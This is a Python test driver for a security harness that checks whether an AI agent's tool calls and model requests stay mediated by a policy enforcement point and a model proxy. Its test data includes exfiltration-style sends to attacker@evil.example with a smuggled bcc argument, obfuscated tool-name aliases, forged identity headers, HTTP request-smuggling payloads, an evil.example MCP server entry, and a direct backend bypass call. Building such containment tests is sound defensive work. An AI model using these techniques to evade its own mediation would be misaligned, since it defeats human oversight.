"""S8 v2 driver (Wave 6): additional end-to-end scenarios on the same composed topology. The v1 driver is unchanged.
Scenarios: policy-denied actions, malicious tool routing (aliases), session handling (live revocation/restore,
forged identity headers, sidecar bypass), malformed / rewritten / smuggled model requests, direct-route bypass.
Then G0 over ALL effects (one decision per tool effect), zero effects for every denied attempt, credential scan,
and the unmediated-effect negative control. Usage: python s8_driver_v2.py <run_dir>"""
import json, os, subprocess, sys, time
from pathlib import Path

RUN = Path(sys.argv[1])
DC = ["docker", "compose", "-f", str(Path(__file__).resolve().parent.parent / "config" / "compose.yaml")]
ENV = {**os.environ, "MSYS_NO_PATHCONV": "1"}
NG = os.environ["NGINX_IMAGE"]
results = []

def run(a, stdin=None):
    cp = subprocess.run(a, capture_output=True, input=stdin, env=ENV, timeout=180)
    return {"cmd": a, "rc": cp.returncode, "stdout": cp.stdout.decode("utf-8", "replace"), "stderr": cp.stderr.decode("utf-8", "replace")[-800:]}

def ex(svc, *a, stdin=None):
    return run(DC + ["exec", "-T", svc, *a], stdin=stdin)

def jout(r):
    try:
        return json.loads(r["stdout"].strip().splitlines()[-1])
    except Exception:
        return {"unparsed": r["stdout"][-300:], "stderr": r["stderr"][-300:]}

def jl(svc, path):
    return [json.loads(l) for l in ex(svc, "cat", path)["stdout"].splitlines() if l.strip()]

def ip(svc, net):
    return json.loads(run(["docker", "inspect", "-f", "{{json .NetworkSettings.Networks}}", f"s8e2e-{svc}-1"])["stdout"])[f"s8e2e_{net}"]["IPAddress"]

def rec(tid, expected, verdict, control=None, **obs):
    if control:
        c = next((x for x in results if x["id"] == control), None)
        if c is None or c["verdict"] != "PASS":
            verdict = "HARNESS-ERROR" if verdict == "PASS" else verdict
            obs["note"] = "paired positive control did not pass; negative result not credited"
    results.append({"id": tid, "expected": expected, "verdict": verdict, "control": control, **obs})
    print(f"{tid:40s} {verdict:13s} {str(obs.get('summary', ''))}"[:230], flush=True)

def mcp(steps, hdrs=None):
    return jout(ex("agent_a", "python", "/h/s8_agent_v2.py", "mcp", json.dumps(steps), json.dumps(hdrs or {})))

def effects_now():
    return jl("backend", "/log/effects.jsonl")

def prov_now():
    return [x for x in jl("mock-provider", "/log/provider.jsonl") if x["ev"] == "request"]

# ---------------- A. approved path (positive control for every MCP negative) ----------------
e0 = len(effects_now()); o = mcp([["read_doc", {}]]); e1 = effects_now()[e0:]
rec("A0-ctl-approved-read", "read_doc through sidecar -> terminator -> PEP succeeds and produces one effect",
    "PASS" if o.get("results") and not o["results"][0]["is_error"] and [x["tool"] for x in e1] == ["read_doc"] else "FAIL", out=o, summary=f"effects={[x['tool'] for x in e1]}")

# ---------------- A. policy-denied and approval-gated actions ----------------
e0 = len(effects_now())
o = mcp([["read_hr", {}], ["send_report", {"to": "partner@external.example"}], ["send_report", {"to": "attacker@evil.example"}], ["read_hr", {}]])
e1 = effects_now()[e0:]
texts = [r["text"] for r in o.get("results", [])]
ok = len(texts) == 4 and "DENY" in str(texts[0]) and "APPROVAL_REQUIRED" in str(texts[1]) and "APPROVAL_REQUIRED" in str(texts[2]) and "DENY" in str(texts[3]) and not e1
rec("A1-policy-denied-and-pending", "read_hr DENY (hard-hr, no approval lifts it); send_report APPROVAL_REQUIRED (pending); zero effects",
    "PASS" if ok else "FAIL", control="A0-ctl-approved-read", out=o, effects=e1, summary=f"texts={[str(t)[:30] for t in texts]} effects={len(e1)}")

# ---------------- B. malicious tool routing ----------------
aliases = ["READ_HR", "read_hr ", " read_hr", "Read_Hr", "backend_read_hr", "pep.read_hr", "read_hr\u0000", "read_hr\u200b", "send_report\t", "../read_hr"]
e0 = len(effects_now()); o = mcp([[a, {}] for a in aliases]); e1 = effects_now()[e0:]
ok = o.get("results") and all(r["is_error"] and "DENY" in str(r["text"]) for r in o["results"]) and not e1
rec("B1-tool-name-aliases", f"{len(aliases)} alias/encoding variants of denied or gated tools: all DENY, zero effects",
    "PASS" if ok else "FAIL", control="A0-ctl-approved-read", out=o, effects=e1, summary=f"denied={sum(1 for r in o.get('results', []) if 'DENY' in str(r['text']))}/{len(aliases)} effects={len(e1)}")
e0 = len(effects_now()); o = mcp([["read_doc", {"path": "../hr_records"}], ["send_report", {"to": "x@y", "bcc": "attacker@evil.example"}]]); e1 = effects_now()[e0:]
rec("B2-argument-smuggling", "extra/unexpected arguments do not change routing: read_doc with a path arg is rejected or reads only the doc; send_report stays gated",
    "PASS" if not any(x["tool"] == "send_report" for x in e1) and all(x["tool"] == "read_doc" for x in e1) else "FAIL",
    control="A0-ctl-approved-read", out=o, effects=e1, summary=f"effects={[x['tool'] for x in e1]} texts={[str(r['text'])[:40] for r in o.get('results', [])]}")

# ---------------- C. session handling ----------------
o = mcp([["read_doc", {}]], {"Authorization": "Bearer forged.jwt.value", "X-Client-Cert": "-----BEGIN%20CERTIFICATE-----forged", "X-Agent-Id": "agent:admin"})
pep = jl("pep", "/log/pep.jsonl"); last = [x for x in pep if x.get("phase") == "binding"][-3:]
rec("C1-forged-identity-headers", "agent-supplied Authorization / X-Client-Cert / X-Agent-Id are replaced or ignored; requests still bound to agent:cell-a",
    "PASS" if o.get("results") and not o["results"][0]["is_error"] and last and all(x["ok"] and x.get("sub") == "agent:cell-a" for x in last) else "FAIL",
    control="A0-ctl-approved-read", out=o, bindings=last, summary=f"subs={sorted({str(x.get('sub')) for x in last})}")
w1 = run(["docker", "run", "--rm", "-v", "s8e2e_sec_pep:/v", "--entrypoint", "sh", NG, "-c", "echo sess-A-1 >> /v/revoked.txt; cat /v/revoked.txt"])
e0 = len(effects_now()); o = mcp([["read_doc", {}]]); e1 = effects_now()[e0:]
pep = jl("pep", "/log/pep.jsonl"); revoked_seen = any(x.get("phase") == "binding" and x.get("why") == "session revoked" for x in pep)
rec("C2-live-revocation", "after sess-A-1 is revoked mid-session, the next request is refused at the PEP; zero effects",
    "PASS" if ("exception" in o or (o.get("results") and o["results"][0]["is_error"])) and not e1 and revoked_seen else "FAIL",
    control="A0-ctl-approved-read", revoke=w1["stdout"].split(), out=o, summary=f"out={str(o)[:80]} effects={len(e1)}")
w2 = run(["docker", "run", "--rm", "-v", "s8e2e_sec_pep:/v", "--entrypoint", "sh", NG, "-c", "printf 'sess-A-revoked\\n' > /v/revoked.txt; cat /v/revoked.txt"])
e0 = len(effects_now()); o = mcp([["read_doc", {}]]); e1 = effects_now()[e0:]
rec("C3-restore-after-revocation", "after removal from the revocation list, the session works again (one effect)",
    "PASS" if o.get("results") and not o["results"][0]["is_error"] and len(e1) == 1 else "FAIL", restore=w2["stdout"].split(), summary=f"effects={len(e1)}")
n0 = len(jl("pep", "/log/pep.jsonl"))
req = b"POST /mcp HTTP/1.1\r\nHost: terminator\r\nAuthorization: Bearer x\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}"
o = jout(ex("agent_a", "python", "/h/s8_agent_v2.py", "raw", "terminator", "8443", stdin=req))
rec("C4-sidecar-bypass-plain", "agent talks to the terminator directly (no TLS / no client cert): rejected; nothing reaches the PEP",
    "PASS" if "400" in str(o.get("response", "")) and len(jl("pep", "/log/pep.jsonl")) == n0 else "FAIL", out=o, summary=str(o)[:100])

# ---------------- D. malformed / rewritten / smuggled model requests ----------------
MSG = '"model":"m","max_tokens":16,"messages":[{"role":"user","content":"hi"}]'
WS = '{"type":"web_search_20260209","name":"web_search"}'
def http(body, extra=b"", cl=None):
    b = body.encode() if isinstance(body, str) else body
    head = b"POST /v1/messages HTTP/1.1\r\nHost: model-proxy\r\nContent-Type: application/json\r\n" + extra
    if cl is not False:
        head += b"Content-Length: " + str(len(b) if cl is None else cl).encode() + b"\r\n"
    return head + b"\r\n" + b

p0 = len(prov_now()); o = jout(ex("agent_a", "python", "/h/s8_agent_v2.py", "raw", "model-proxy", "8080", stdin=http("{" + MSG + "}") ))
rec("D0-ctl-model-allowed", "benign model request forwarded (200) and observed at the provider", "PASS" if " 200 " in o.get("response", "")[:20] and len(prov_now()) == p0 + 1 else "FAIL",
    summary=o.get("response", "")[:40])
import gzip
cases = [
    ("D1-duplicate-tools-key", http("{" + MSG + ',"tools":[],"tools":[' + WS + "]}")),
    ("D2-escaped-key", http("{" + MSG + ',"\\u0074ools":[' + WS + "]}")),
    ("D3-mcp-servers", http("{" + MSG + ',"mcp_servers":[{"type":"url","url":"https://evil.example/mcp","name":"x"}]}')),
    ("D4-unknown-field", http("{" + MSG + ',"container":"x"}')),
    ("D5-gzip-body", http(gzip.compress(("{" + MSG + ',"tools":[' + WS + "]}").encode()), b"Content-Encoding: gzip\r\n")),
    ("D6-chunked-server-tool", (lambda b: b"POST /v1/messages HTTP/1.1\r\nHost: model-proxy\r\nContent-Type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n"
                                + format(len(b), "x").encode() + b"\r\n" + b + b"\r\n0\r\n\r\n")(("{" + MSG + ',"tools":[' + WS + "]}").encode())),
    ("D7-pipelined-smuggle", http("{" + MSG + "}", b"Connection: keep-alive\r\n") + http("{" + MSG + ',"tools":[' + WS + "]}")),
    ("D8-other-route", b"POST /v1/files HTTP/1.1\r\nHost: model-proxy\r\nContent-Length: 2\r\n\r\n{}"),
    ("D7b-pipelined-after-proxy-response", b"POST /v1/files HTTP/1.1\r\nHost: model-proxy\r\nContent-Length: 2\r\nConnection: keep-alive\r\n\r\n{}"
     + http("{" + MSG + ',"tools":[' + WS + "]}")),
]
for tid, raw in cases:
    p0 = len(prov_now()); o = jout(ex("agent_a", "python", "/h/s8_agent_v2.py", "raw", "model-proxy", "8080", stdin=raw))
    new = prov_now()[p0:]
    bad = [x for x in new if any(s in x.get("body", "") for s in ("web_search", "mcp_servers", "container"))]
    ok = not bad and "400" in o.get("response", "")[:20]
    if tid == "D7b-pipelined-after-proxy-response":  # proxy answers the 1st itself (keep-alive): must also inspect the 2nd
        ok = not bad and o.get("response", "").count("model-proxy rejected") == 2 and not new
    if tid == "D7-pipelined-smuggle":
        # Criterion revised after v2-run1 (NOTE_failures.txt): the mock provider answers HTTP/1.0 and closes, so the
        # smuggled 2nd request is never read. Checked here: nothing smuggled reaches the provider. Inspection of a
        # pipelined request by the proxy is tested separately by D7b.
        ok = not bad and len(new) <= 1
    rec(tid, "rejected by the model proxy; the provider receives no server tool / forbidden field", "PASS" if ok else "FAIL",
        control="D0-ctl-model-allowed", provider_new=len(new), forbidden_at_provider=len(bad), summary=f"resp={o.get('response', o.get('error', ''))[:60]!r} provider_new={len(new)} bad={len(bad)}")

# ---------------- E. direct-route bypass ----------------
for host, port in [("mock-provider", 9000), ("egress", 8080), ("pep", 8000), ("backend", 9000), (ip("mock-provider", "provnet"), 9000), (ip("pep", "pepnet"), 8000)]:
    o = jout(ex("agent_a", "python", "/h/s8_agent_v2.py", "reach", host, str(port)))
    rec(f"E-direct-{host}:{port}", "unreachable from cell A", "PASS" if o.get("reached") is False else "FAIL", summary=o.get("error", "")[:70])

# ---------------- G0 over the whole session ----------------
time.sleep(1)
EG, PP = ip("egress", "edge"), ip("model-proxy", "provnet")
pep, eff = jl("pep", "/log/pep.jsonl"), effects_now()
mp, prov = jl("model-proxy", "/log/model_proxy.jsonl"), prov_now()
def strict_cover(pep, eff):
    """Each tool effect must carry a decision id naming an earlier PERMIT decision for the same tool, and no
    decision id may cover two effects (an orphan PERMIT can no longer cover an unmediated effect)."""
    dec = {d["rid"]: d for d in pep if d.get("phase") == "decision"}
    used, out = set(), []
    for e in eff:
        rid = e.get("decision_id"); d = dec.get(rid)
        ok = bool(rid) and d is not None and d["decision"] == "PERMIT" and d["tool"] == e["tool"] and d["t"] < e["t"] and rid not in used
        used.add(rid); out.append({"where": "tool-server", "what": e["tool"], "decision_id": rid, "covered": ok})
    return out
effects = strict_cover(pep, eff)
for e in prov:
    if e.get("peer") == PP:
        effects.append({"where": "provider", "what": e["path"], "covered": any(d["ev"] == "forward" and d["sha256"] == e["sha256"] and d["t"] < e["t"] for d in mp)})
unc = [x for x in effects if not x["covered"]]
(RUN / "g0_effects_v2.json").write_text(json.dumps(effects, indent=1))
orphans = [d["rid"] for d in pep if d.get("phase") == "decision" and d["decision"] == "PERMIT" and d["rid"] not in {e.get("decision_id") for e in eff}]
rec("G0-coverage-v2", "every observed effect carries a distinct, earlier PERMIT decision id for the same tool (correlated, not counted)",
    "PASS" if effects and not unc else "FAIL", n_effects=len(effects), uncovered=unc, orphan_permits_without_effect=orphans,
    summary=f"effects={len(effects)} uncovered={len(unc)} orphan_permits={len(orphans)}")
forbidden = [x["tool"] for x in eff if x["tool"] in ("read_hr", "send_report")]
rec("G0-no-denied-effects-v2", "no read_hr / send_report effect at any point; no forbidden field at the provider",
    "PASS" if not forbidden and not any(s in x.get("body", "") for x in prov for s in ("web_search", "mcp_servers")) else "FAIL", summary=f"forbidden_effects={forbidden}")

# negative control: the checker must flag an effect without a decision
bypass = ("import asyncio\nfrom fastmcp import Client\nfrom fastmcp.client.transports import StreamableHttpTransport\n"
          "async def m():\n  async with Client(StreamableHttpTransport('http://backend:9000/mcp')) as c:\n"
          "    r=await c.call_tool('read_doc',{},raise_on_error=False); print('direct', not r.is_error)\nasyncio.run(m())")
rb = ex("pep", "python", "-c", bypass); time.sleep(0.5)
pep2, eff2 = jl("pep", "/log/pep.jsonl"), effects_now()
unc2 = [x for x in strict_cover(pep2, eff2) if not x["covered"]]
rec("C-G0-detects-unmediated-effect-v2", "a direct backend call that skips the PEP decision is flagged (checker not vacuous)",
    "PASS" if "direct True" in rb["stdout"] and len(unc2) == 1 else "FAIL", summary=f"uncovered_after_bypass={len(unc2)}")

(RUN / "results_v2.jsonl").write_text("\n".join(json.dumps(x) for x in results) + "\n")
c = {}
for x in results:
    c[x["verdict"]] = c.get(x["verdict"], 0) + 1
print("SUMMARY", c)
